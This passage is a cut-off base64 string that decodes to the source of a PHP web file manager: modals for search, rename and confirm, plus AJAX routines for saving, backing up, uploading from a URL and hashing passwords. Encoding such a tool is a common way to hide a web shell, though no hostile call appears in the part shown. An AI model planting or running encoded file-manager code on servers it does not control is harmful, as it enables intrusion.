0ZW50IDw/cGhwIGVjaG8gZm1fZ2V0X3RoZW1lKCk7ID8+Ij4NCiAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1oZWFkZXIiPg0KICAgICAgICAgICAgPGg1IGNsYXNzPSJtb2RhbC10aXRsZSBjb2wtMTAiIGlkPSJzZWFyY2hNb2RhbExhYmVsIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCBtYi0zIj4NCiAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iPD9waHAgZWNobyBsbmcoJ1NlYXJjaCcpID8+IDw/cGhwIGVjaG8gbG5nKCdhIGZpbGVzJykgPz4iIGFyaWEtbGFiZWw9Ijw/cGhwIGVjaG8gbG5nKCdTZWFyY2gnKSA/PiIgYXJpYS1kZXNjcmliZWRieT0ic2VhcmNoLWFkZG9uMyIgaWQ9ImFkdmFuY2VkLXNlYXJjaCIgYXV0b2ZvY3VzIHJlcXVpcmVkPg0KICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImlucHV0LWdyb3VwLXRleHQiIGlkPSJzZWFyY2gtYWRkb24zIj48aSBjbGFzcz0iZmEgZmEtc2VhcmNoIj48L2k+PC9zcGFuPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9oNT4NCiAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuLWNsb3NlIiBkYXRhLWJzLWRpc21pc3M9Im1vZGFsIiBhcmlhLWxhYmVsPSJDbG9zZSI+PC9idXR0b24+DQogICAgICAgICAgPC9kaXY+DQogICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtYm9keSI+DQogICAgICAgICAgICA8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJsZHMtZmFjZWJvb2siPjxkaXY+PC9kaXY+PGRpdj48L2Rpdj48ZGl2PjwvZGl2PjwvZGl2Pg0KICAgICAgICAgICAgICAgIDx1bCBpZD0ic2VhcmNoLXdyYXBwZXIiPg0KICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0ibS0yIj48P3BocCBlY2hvIGxuZygnU2VhcmNoIGZpbGUgaW4gZm9sZGVyIGFuZCBzdWJmb2xkZXJzLi4uJykgPz48L3A+DQogICAgICAgICAgICAgICAgPC91bD4NCiAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCg0KICAgIDwhLS1SZW5hbWUgTW9kYWwgLS0+DQogICAgPGRpdiBjbGFzcz0ibW9kYWwgbW9kYWwtYWxlcnQiIGRhdGEtYnMtYmFja2Ryb3A9InN0YXRpYyIgZGF0YS1icy1rZXlib2FyZD0iZmFsc2UiIHRhYmluZGV4PSItMSIgcm9sZT0iZGlhbG9nIiBpZD0icmVuYW1lRGFpbG9nIj4NCiAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyIgcm9sZT0iZG9jdW1lbnQiPg0KICAgICAgICA8Zm9ybSBjbGFzcz0ibW9kYWwtY29udGVudCByb3VuZGVkLTMgc2hhZG93IDw/cGhwIGVjaG8gZm1fZ2V0X3RoZW1lKCk7ID8+IiBtZXRob2Q9InBvc3QiIGF1dG9jb21wbGV0ZT0ib2ZmIj4NCiAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5IHAtNCB0ZXh0LWNlbnRlciI+DQogICAgICAgICAgICA8aDUgY2xhc3M9Im1iLTMiPjw/cGhwIGVjaG8gbG5nKCdBcmUgeW91IHN1cmUgd2FudCB0byByZW5hbWU/JykgPz48L2g1Pg0KICAgICAgICAgICAgPHAgY2xhc3M9Im1iLTEiPg0KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJyZW5hbWVfdG8iIGlkPSJqcy1yZW5hbWUtdG8iIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHBsYWNlaG9sZGVyPSI8P3BocCBlY2hvIGxuZygnRW50ZXIgbmV3IGZpbGUgbmFtZScpID8+IiByZXF1aXJlZD4NCiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9Ijw/cGhwIGVjaG8gJF9TRVNTSU9OWyd0b2tlbiddOyA/PiI+DQogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icmVuYW1lX2Zyb20iIGlkPSJqcy1yZW5hbWUtZnJvbSI+DQogICAgICAgICAgICA8L3A+DQogICAgICAgICAgPC9kaXY+DQogICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtZm9vdGVyIGZsZXgtbm93cmFwIHAtMCI+DQogICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tbGcgYnRuLWxpbmsgZnMtNiB0ZXh0LWRlY29yYXRpb24tbm9uZSBjb2wtNiBtLTAgcm91bmRlZC0wIGJvcmRlci1lbmQiIGRhdGEtYnMtZGlzbWlzcz0ibW9kYWwiPjw/cGhwIGVjaG8gbG5nKCdDYW5jZWwnKSA/PjwvYnV0dG9uPg0KICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1saW5rIGZzLTYgdGV4dC1kZWNvcmF0aW9uLW5vbmUgY29sLTYgbS0wIHJvdW5kZWQtMCI+PHN0cm9uZz48P3BocCBlY2hvIGxuZygnT2theScpID8+PC9zdHJvbmc+PC9idXR0b24+DQogICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZm9ybT4NCiAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KDQogICAgPCEtLSBDb25maXJtIE1vZGFsIC0tPg0KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9odG1sIiBpZD0ianMtdHBsLWNvbmZpcm0iPg0KICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbCBtb2RhbC1hbGVydCBjb25maXJtRGFpbG9nIiBkYXRhLWJzLWJhY2tkcm9wPSJzdGF0aWMiIGRhdGEtYnMta2V5Ym9hcmQ9ImZhbHNlIiB0YWJpbmRleD0iLTEiIHJvbGU9ImRpYWxvZyIgaWQ9ImNvbmZpcm1EYWlsb2ctPCV0aGlzLmlkJT4iPg0KICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyIgcm9sZT0iZG9jdW1lbnQiPg0KICAgICAgICAgICAgPGZvcm0gY2xhc3M9Im1vZGFsLWNvbnRlbnQgcm91bmRlZC0zIHNoYWRvdyA8P3BocCBlY2hvIGZtX2dldF90aGVtZSgpOyA/PiIgbWV0aG9kPSJwb3N0IiBhdXRvY29tcGxldGU9Im9mZiIgYWN0aW9uPSI8JXRoaXMuYWN0aW9uJT4iPg0KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5IHAtNCB0ZXh0LWNlbnRlciI+DQogICAgICAgICAgICAgICAgPGg1IGNsYXNzPSJtYi0yIj48P3BocCBlY2hvIGxuZygnQXJlIHlvdSBzdXJlIHdhbnQgdG8nKSA/PiA8JXRoaXMudGl0bGUlPiA/PC9oNT4NCiAgICAgICAgICAgICAgICA8cCBjbGFzcz0ibWItMSI+PCV0aGlzLmNvbnRlbnQlPjwvcD4NCiAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWZvb3RlciBmbGV4LW5vd3JhcCBwLTAiPg0KICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1sZyBidG4tbGluayBmcy02IHRleHQtZGVjb3JhdGlvbi1ub25lIGNvbC02IG0tMCByb3VuZGVkLTAgYm9yZGVyLWVuZCIgZGF0YS1icy1kaXNtaXNzPSJtb2RhbCI+PD9waHAgZWNobyBsbmcoJ0NhbmNlbCcpID8+PC9idXR0b24+DQogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSI8P3BocCBlY2hvICRfU0VTU0lPTlsndG9rZW4nXTsgPz4iPg0KICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1sZyBidG4tbGluayBmcy02IHRleHQtZGVjb3JhdGlvbi1ub25lIGNvbC02IG0tMCByb3VuZGVkLTAiIGRhdGEtYnMtZGlzbWlzcz0ibW9kYWwiPjxzdHJvbmc+PD9waHAgZWNobyBsbmcoJ09rYXknKSA/Pjwvc3Ryb25nPjwvYnV0dG9uPg0KICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9zY3JpcHQ+DQoNCiAgICA8P3BocA0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFNob3cgcGFnZSBmb290ZXIgYWZ0ZXIgbG9naW4NCiAgICAgKi8NCiAgICBmdW5jdGlvbiBmbV9zaG93X2Zvb3RlcigpDQogICAgew0KICAgID8+DQo8L2Rpdj4NCjw/cGhwIHByaW50X2V4dGVybmFsKCdqcy1qcXVlcnknKTsgPz4NCjw/cGhwIHByaW50X2V4dGVybmFsKCdqcy1ib290c3RyYXAnKTsgPz4NCjw/cGhwIHByaW50X2V4dGVybmFsKCdqcy1qcXVlcnktZGF0YXRhYmxlcycpOyA/Pg0KPD9waHAgaWYgKEZNX1VTRV9ISUdITElHSFRKUyAmJiBpc3NldCgkX0dFVFsndmlldyddKSk6ID8+DQogICAgPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ2pzLWhpZ2hsaWdodGpzJyk7ID8+DQogICAgPHNjcmlwdD5obGpzLmhpZ2hsaWdodEFsbCgpOyB2YXIgaXNIaWdobGlnaHRpbmdFbmFibGVkID0gdHJ1ZTs8L3NjcmlwdD4NCjw/cGhwIGVuZGlmOyA/Pg0KPHNjcmlwdD4NCiAgICBmdW5jdGlvbiB0ZW1wbGF0ZShodG1sLG9wdGlvbnMpew0KICAgICAgICB2YXIgcmU9LzxcJShbXlwlPl0rKT9cJT4vZyxyZUV4cD0vKF4oICk/KGlmfGZvcnxlbHNlfHN3aXRjaHxjYXNlfGJyZWFrfHt8fSkpKC4qKT8vZyxjb2RlPSd2YXIgcj1bXTtcbicsY3Vyc29yPTAsbWF0Y2g7dmFyIGFkZD1mdW5jdGlvbihsaW5lLGpzKXtqcz8oY29kZSs9bGluZS5tYXRjaChyZUV4cCk/bGluZSsnXG4nOidyLnB1c2goJytsaW5lKycpO1xuJyk6KGNvZGUrPWxpbmUhPScnPydyLnB1c2goIicrbGluZS5yZXBsYWNlKC8iL2csJ1xcIicpKyciKTtcbic6JycpO3JldHVybiBhZGR9DQogICAgICAgIHdoaWxlKG1hdGNoPXJlLmV4ZWMoaHRtbCkpe2FkZChodG1sLnNsaWNlKGN1cnNvcixtYXRjaC5pbmRleCkpKG1hdGNoWzFdLCEwKTtjdXJzb3I9bWF0Y2guaW5kZXgrbWF0Y2hbMF0ubGVuZ3RofQ0KICAgICAgICBhZGQoaHRtbC5zdWJzdHIoY3Vyc29yLGh0bWwubGVuZ3RoLWN1cnNvcikpO2NvZGUrPSdyZXR1cm4gci5qb2luKCIiKTsnO3JldHVybiBuZXcgRnVuY3Rpb24oY29kZS5yZXBsYWNlKC9bXHJcdFxuXS9nLCcnKSkuYXBwbHkob3B0aW9ucykNCiAgICB9DQogICAgZnVuY3Rpb24gcmVuYW1lKGUsIHQpIHsgaWYodCkgeyAkKCIjanMtcmVuYW1lLWZyb20iKS52YWwodCk7JCgiI2pzLXJlbmFtZS10byIpLnZhbCh0KTsgJCgiI3JlbmFtZURhaWxvZyIpLm1vZGFsKCdzaG93Jyk7IH0gfQ0KICAgIGZ1bmN0aW9uIGNoYW5nZV9jaGVja2JveGVzKGUsIHQpIHsgZm9yICh2YXIgbiA9IGUubGVuZ3RoIC0gMTsgbiA+PSAwOyBuLS0pIGVbbl0uY2hlY2tlZCA9ICJib29sZWFuIiA9PSB0eXBlb2YgdCA/IHQgOiAhZVtuXS5jaGVja2VkIH0NCiAgICBmdW5jdGlvbiBnZXRfY2hlY2tib3hlcygpIHsgZm9yICh2YXIgZSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJmaWxlW10iKSwgdCA9IFtdLCBuID0gZS5sZW5ndGggLSAxOyBuID49IDA7IG4tLSkgKGVbbl0udHlwZSA9ICJjaGVja2JveCIpICYmIHQucHVzaChlW25dKTsgcmV0dXJuIHQgfQ0KICAgIGZ1bmN0aW9uIHNlbGVjdF9hbGwoKSB7IGNoYW5nZV9jaGVja2JveGVzKGdldF9jaGVja2JveGVzKCksICEwKSB9DQogICAgZnVuY3Rpb24gdW5zZWxlY3RfYWxsKCkgeyBjaGFuZ2VfY2hlY2tib3hlcyhnZXRfY2hlY2tib3hlcygpLCAhMSkgfQ0KICAgIGZ1bmN0aW9uIGludmVydF9hbGwoKSB7IGNoYW5nZV9jaGVja2JveGVzKGdldF9jaGVja2JveGVzKCkpIH0NCiAgICBmdW5jdGlvbiBjaGVja2JveF90b2dnbGUoKSB7IHZhciBlID0gZ2V0X2NoZWNrYm94ZXMoKTsgZS5wdXNoKHRoaXMpLCBjaGFuZ2VfY2hlY2tib3hlcyhlKSB9DQogICAgZnVuY3Rpb24gYmFja3VwKGUsIHQpIHsgLy8gQ3JlYXRlIGZpbGUgYmFja3VwIHdpdGggLmJjaw0KICAgICAgICB2YXIgbiA9IG5ldyBYTUxIdHRwUmVxdWVzdCwNCiAgICAgICAgICAgIGEgPSAicGF0aD0iICsgZSArICImZmlsZT0iICsgdCArICImdG9rZW49Iisgd2luZG93LmNzcmYgKyImdHlwZT1iYWNrdXAmYWpheD10cnVlIjsNCiAgICAgICAgcmV0dXJuIG4ub3BlbigiUE9TVCIsICIiLCAhMCksIG4uc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpLCBuLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHsNCiAgICAgICAgICAgIDQgPT0gbi5yZWFkeVN0YXRlICYmIDIwMCA9PSBuLnN0YXR1cyAmJiB0b2FzdChuLnJlc3BvbnNlVGV4dCkNCiAgICAgICAgfSwgbi5zZW5kKGEpLCAhMQ0KICAgIH0NCiAgICAvLyBUb2FzdCBtZXNzYWdlDQogICAgZnVuY3Rpb24gdG9hc3QodHh0KSB7IHZhciB4ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInNuYWNrYmFyIik7eC5pbm5lckhUTUw9dHh0O3guY2xhc3NOYW1lID0gInNob3ciO3NldFRpbWVvdXQoZnVuY3Rpb24oKXsgeC5jbGFzc05hbWUgPSB4LmNsYXNzTmFtZS5yZXBsYWNlKCJzaG93IiwgIiIpOyB9LCAzMDAwKTsgfQ0KICAgIC8vIFNhdmUgZmlsZQ0KICAgIGZ1bmN0aW9uIGVkaXRfc2F2ZShlLCB0KSB7DQogICAgICAgIHZhciBuID0gImFjZSIgPT0gdCA/IGVkaXRvci5nZXRTZXNzaW9uKCkuZ2V0VmFsdWUoKSA6IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJub3JtYWwtZWRpdG9yIikudmFsdWU7DQogICAgICAgIGlmICh0eXBlb2YgbiAhPT0gJ3VuZGVmaW5lZCcgJiYgbiAhPT0gbnVsbCkgew0KICAgICAgICAgICAgaWYgKHRydWUpIHsNCiAgICAgICAgICAgICAgICB2YXIgZGF0YSA9IHthamF4OiB0cnVlLCBjb250ZW50OiBuLCB0eXBlOiAnc2F2ZScsIHRva2VuOiB3aW5kb3cuY3NyZn07DQoNCiAgICAgICAgICAgICAgICAkLmFqYXgoew0KICAgICAgICAgICAgICAgICAgICB0eXBlOiAiUE9TVCIsDQogICAgICAgICAgICAgICAgICAgIHVybDogd2luZG93LmxvY2F0aW9uLA0KICAgICAgICAgICAgICAgICAgICBkYXRhOiBKU09OLnN0cmluZ2lmeShkYXRhKSwNCiAgICAgICAgICAgICAgICAgICAgY29udGVudFR5cGU6ICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04IiwNCiAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24obWVzKXt0b2FzdCgiU2F2ZWQgU3VjY2Vzc2Z1bGx5Iik7IHdpbmRvdy5vbmJlZm9yZXVubG9hZCA9IGZ1bmN0aW9uKCkge3JldHVybn19LA0KICAgICAgICAgICAgICAgICAgICBmYWlsdXJlOiBmdW5jdGlvbihtZXMpIHt0b2FzdCgiRXJyb3I6IHRyeSBhZ2FpbiIpO30sDQogICAgICAgICAgICAgICAgICAgIGVycm9yOiBmdW5jdGlvbihtZXMpIHt0b2FzdChgPHAgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6cmVkIj4ke21lcy5yZXNwb25zZVRleHR9PC9wPmApO30NCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgdmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJmb3JtIik7DQogICAgICAgICAgICAgICAgYS5zZXRBdHRyaWJ1dGUoIm1ldGhvZCIsICJQT1NUIiksIGEuc2V0QXR0cmlidXRlKCJhY3Rpb24iLCAiIik7DQogICAgICAgICAgICAgICAgdmFyIG8gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJ0ZXh0YXJlYSIpOw0KICAgICAgICAgICAgICAgIG8uc2V0QXR0cmlidXRlKCJ0eXBlIiwgInRleHRhcmVhIiksIG8uc2V0QXR0cmlidXRlKCJuYW1lIiwgInNhdmVkYXRhIik7DQogICAgICAgICAgICAgICAgbGV0IGN4ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTsgY3guc2V0QXR0cmlidXRlKCJ0eXBlIiwgImhpZGRlbiIpO2N4LnNldEF0dHJpYnV0ZSgibmFtZSIsICJ0b2tlbiIpO2N4LnNldEF0dHJpYnV0ZSgidmFsdWUiLCB3aW5kb3cuY3NyZik7DQogICAgICAgICAgICAgICAgdmFyIGMgPSBkb2N1bWVudC5jcmVhdGVUZXh0Tm9kZShuKTsNCiAgICAgICAgICAgICAgICBvLmFwcGVuZENoaWxkKGMpLCBhLmFwcGVuZENoaWxkKG8pLCBhLmFwcGVuZENoaWxkKGN4KSwgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKSwgYS5zdWJtaXQoKQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIGZ1bmN0aW9uIHNob3dfbmV3X3B3ZCgpIHsgJCgiLmpzLW5ldy1wd2QiKS50b2dnbGVDbGFzcygnaGlkZGVuJyk7IH0NCiAgICAvLyBTYXZlIFNldHRpbmdzDQogICAgZnVuY3Rpb24gc2F2ZV9zZXR0aW5ncygkdGhpcykgew0KICAgICAgICBsZXQgZm9ybSA9ICQoJHRoaXMpOw0KICAgICAgICAkLmFqYXgoew0KICAgICAgICAgICAgdHlwZTogZm9ybS5hdHRyKCdtZXRob2QnKSwgdXJsOiBmb3JtLmF0dHIoJ2FjdGlvbicpLCBkYXRhOiBmb3JtLnNlcmlhbGl6ZSgpKyImdG9rZW49Iisgd2luZG93LmNzcmYgKyImYWpheD0iK3RydWUsDQogICAgICAgICAgICBzdWNjZXNzOiBmdW5jdGlvbiAoZGF0YSkge2lmKGRhdGEpIHsgd2luZG93LmxvY2F0aW9uLnJlbG9hZCgpO319DQogICAgICAgIH0pOyByZXR1cm4gZmFsc2U7DQogICAgfQ0KICAgIC8vQ3JlYXRlIG5ldyBwYXNzd29yZCBoYXNoDQogICAgZnVuY3Rpb24gbmV3X3Bhc3N3b3JkX2hhc2goJHRoaXMpIHsNCiAgICAgICAgbGV0IGZvcm0gPSAkKCR0aGlzKSwgJHB3ZCA9ICQoIiNqcy1wd2QtcmVzdWx0Iik7ICRwd2QudmFsKCcnKTsNCiAgICAgICAgJC5hamF4KHsNCiAgICAgICAgICAgIHR5cGU6IGZvcm0uYXR0cignbWV0aG9kJyksIHVybDogZm9ybS5hdHRyKCdhY3Rpb24nKSwgZGF0YTogZm9ybS5zZXJpYWxpemUoKSsiJnRva2VuPSIrIHdpbmRvdy5jc3JmICsiJmFqYXg9Iit0cnVlLA0KICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24gKGRhdGEpIHsgaWYoZGF0YSkgeyAkcHdkLnZhbChkYXRhKTsgfSB9DQogICAgICAgIH0pOyByZXR1cm4gZmFsc2U7DQogICAgfQ0KICAgIC8vIFVwbG9hZCBmaWxlcyB1c2luZyBVUkwgQHBhcmFtIHtPYmplY3R9DQogICAgZnVuY3Rpb24gdXBsb2FkX2Zyb21fdXJsKCR0aGlzKSB7DQogICAgICAgIGxldCBmb3JtID0gJCgkdGhpcyksIHJlc3VsdFdyYXBwZXIgPSAkKCJkaXYjanMtdXJsLXVwbG9hZF9fbGlzdCIpOw0KICAgICAgICAkLmFqYXgoew0KICAgICAgICAgICAgdHlwZTogZm9ybS5hdHRyKCdtZXRob2QnKSwgdXJsOiBmb3JtLmF0dHIoJ2FjdGlvbicpLCBkYXRhOiBmb3JtLnNlcmlhbGl6ZSgpKyImdG9rZW49Iisgd2luZG93LmNzcmYgKyImYWpheD0iK3RydWUsDQogICAgICAgICAgICBiZWZvcmVTZW5kOiBmdW5jdGlvbigpIHsgZm9ybS5maW5kKCJpbnB1dFtuYW1lPXVwbG9hZHVybF0iKS5hdHRyKCJkaXNhYmxlZCIsImRpc2FibGVkIik7IGZvcm0uZmluZCgiYnV0dG9uIikuaGlkZSgpOyBmb3JtLmZpbmQoIi5sZHMtZmFjZWJvb2siKS5hZGRDbGFzcygnc2hvdy1tZScpOyB9LA0KICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24gKGRhdGEpIHsNCiAgICAgICAgICAgICAgICBpZihkYXRhKSB7DQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSBKU09OLnBhcnNlKGRhdGEpOw0KICAgICAgICAgICAgICAgICAgICBpZihkYXRhLmRvbmUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdFdyYXBwZXIuYXBwZW5kKCc8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIHJvdyI+VXBsb2FkZWQgU3VjY2Vzc2Z1bDogJytkYXRhLmRvbmUubmFtZSsnPC9kaXY+Jyk7IGZvcm0uZmluZCgiaW5wdXRbbmFtZT11cGxvYWR1cmxdIikudmFsKCcnKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmKGRhdGFbJ2ZhaWwnXSkgeyByZXN1bHRXcmFwcGVyLmFwcGVuZCgnPGRpdiBjbGFzcz0iYWxlcnQgYWxlcnQtZGFuZ2VyIHJvdyI+RXJyb3I6ICcrZGF0YS5mYWlsLm1lc3NhZ2UrJzwvZGl2PicpOyB9DQogICAgICAgICAgICAgICAgICAgIGZvcm0uZmluZCgiaW5wdXRbbmFtZT11cGxvYWR1cmxdIikucmVtb3ZlQXR0cigiZGlzYWJsZWQiKTtmb3JtLmZpbmQoImJ1dHRvbiIpLnNob3coKTtmb3JtLmZpbmQoIi5sZHMtZmFjZWJvb2siKS5yZW1vdmVDbGFzcygnc2hvdy1tZScpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oeGhyKSB7DQogICAgICAgICAgICAgICAgZm9ybS5maW5kKCJpbnB1dFtuYW1lPXVwbG9hZHVybF0iKS5yZW1vdmVBdHRyKCJkaXNhYmxlZCIpO2Zvcm0uZmluZCgiYnV0dG9uIikuc2hvdygpO2Zvcm0uZmluZCgiLmxkcy1mYWNlYm9vayIpLnJlbW92ZUNsYXNzKCdzaG93LW1lJyk7Y29uc29sZS5lcnJvcih4aHIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9KTsgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICAvLyBTZWFyY2ggdGVtcGxhdGUNCiAgICBmdW5jdGlvbiBzZWFyY2hfdGVtcGxhdGUoZGF0YSkgew0KICAgICAgICB2YXIgcmVzcG9uc2UgPSAiIjsNCiAgICAgICAgJC5lYWNoKGRhdGEsIGZ1bmN0aW9uIChrZXksIHZhbCkgew0KICAgICAgICAgICAgcmVzcG9uc2UgKz0gYDxsaT48YSBocmVmPSI/cD0ke3ZhbC5wYXRofSZ2aWV3PSR7dmFsLm5hbWV9Ij4ke3ZhbC5wYXRofS8ke3ZhbC5uYW1lfTwvYT48L2xpPmA7DQogICAgICAgIH0pOw0KICAgICAgICByZXR1cm4gcmVzcG9uc2U7DQogICAgfQ0KICAgIC8vIEFkdmFuY2Ugc2VhcmNoDQogICAgZnVuY3Rpb24gZm1fc2VhcmNoKCkgew0KICAgICAgICB2YXIgc2VhcmNoVHh0ID0gJCgiaW5wdXQjYWR2YW5jZWQtc2VhcmNoIikudmFsKCksIHNlYXJjaFdyYXBwZXIgPSAkKCJ1bCNzZWFyY2gtd3JhcHBlciIpLCBwYXRoID0gJCgiI2pzLXNlYXJjaC1tb2RhbCIpLmF0dHIoImhyZWYiKSwgX2h0bWwgPSAiIiwgJGxvYWRlciA9ICQoImRpdi5sZHMtZmFjZWJvb2siKTsNCiAgICAgICAgaWYoISFzZWFyY2hUeHQgJiYgc2VhcmNoVHh0Lmxlbmd0aCA+IDIgJiYgcGF0aCkgew0KICAgICAgICAgICAgdmFyIGRhdGEgPSB7YWpheDogdHJ1ZSwgY29udGVudDogc2VhcmNoVHh0LCBwYXRoOnBhdGgsIHR5cGU6ICdzZWFyY2gnLCB0b2tlbjogd2luZG93LmNzcmYgfTsNCiAgICAgICAgICAgICQuYWpheCh7DQogICAgICAgICAgICAgICAgdHlwZTogIlBPU1QiLA0KICAgICAgICAgICAgICAgIHVybDogd2luZG93LmxvY2F0aW9uLA0KICAgICAgICAgICAgICAgIGRhdGE6IGRhdGEsDQogICAgICAgICAgICAgICAgYmVmb3JlU2VuZDogZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgICAgIHNlYXJjaFdyYXBwZXIuaHRtbCgnJyk7DQogICAgICAgICAgICAgICAgICAgICRsb2FkZXIuYWRkQ2xhc3MoJ3Nob3ctbWUnKTsNCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKGRhdGEpew0KICAgICAgICAgICAgICAgICAgICAkbG9hZGVyLnJlbW92ZUNsYXNzKCdzaG93LW1lJyk7DQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSBKU09OLnBhcnNlKGRhdGEpOw0KICAgICAgICAgICAgICAgICAgICBpZihkYXRhICYmIGRhdGEubGVuZ3RoKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBfaHRtbCA9IHNlYXJjaF90ZW1wbGF0ZShkYXRhKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlYXJjaFdyYXBwZXIuaHRtbChfaHRtbCk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7IHNlYXJjaFdyYXBwZXIuaHRtbCgnPHAgY2xhc3M9Im0tMiI+Tm8gcmVzdWx0IGZvdW5kITxwPicpOyB9DQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oeGhyKSB7ICRsb2FkZXIucmVtb3ZlQ2xhc3MoJ3Nob3ctbWUnKTsgc2VhcmNoV3JhcHBlci5odG1sKCc8cCBjbGFzcz0ibS0yIj5FUlJPUjogVHJ5IGFnYWluIGxhdGVyITwvcD4nKTsgfSwNCiAgICAgICAgICAgICAgICBmYWlsdXJlOiBmdW5jdGlvbihtZXMpIHsgJGxvYWRlci5yZW1vdmVDbGFzcygnc2hvdy1tZScpOyBzZWFyY2hXcmFwcGVyLmh0bWwoJzxwIGNsYXNzPSJtLTIiPkVSUk9SOiBUcnkgYWdhaW4gbGF0ZXIhPC9wPicpO30NCiAgICAgICAgICAgIH0pOw0KICAgICAgICB9IGVsc2UgeyBzZWFyY2hXcmFwcGVyLmh0bWwoIk9PUFM6IG1pbmltdW0gMyBjaGFyYWN0ZXJzIHJlcXVpcmVkISIpOyB9DQogICAgfQ0KDQogICAgLy8gYWN0aW9uIGNvbmZpcm0gZGFpbG9nIG1vZGFsDQogICAgZnVuY3Rpb24gY29uZmlybURhaWxvZyhlLCBpZCA9IDAsIHRpdGxlID0gIkFjdGlvbiIsIGNvbnRlbnQgPSAiIiwgYWN0aW9uID0gbnVsbCkgew0KICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgIGNvbnN0IHRwbE9iaiA9IHtpZCwgdGl0bGUsIGNvbnRlbnQ6IGRlY29kZVVSSUNvbXBvbmVudChjb250ZW50LnJlcGxhY2UoL1wrL2csICcgJykpLCBhY3Rpb259Ow0KICAgICAgICBsZXQgdHBsID0gJCgiI2pzLXRwbC1jb25maXJtIikuaHRtbCgpOw0KICAgICAgICAkKCIubW9kYWwuY29u